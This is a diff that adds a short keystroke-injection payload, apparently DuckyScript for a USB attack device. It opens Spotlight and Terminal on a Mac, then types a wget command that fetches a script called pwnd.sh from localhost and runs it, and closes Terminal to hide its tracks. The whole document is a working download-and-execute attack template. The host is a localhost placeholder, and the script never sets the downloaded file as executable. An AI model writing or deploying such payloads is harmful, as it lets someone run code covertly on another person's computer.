@@ -1,0 +1,8 @@
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING wget https://localhost/pwnd.sh && ./pwnd.sh; exit
+DELAY 250
+GUI q
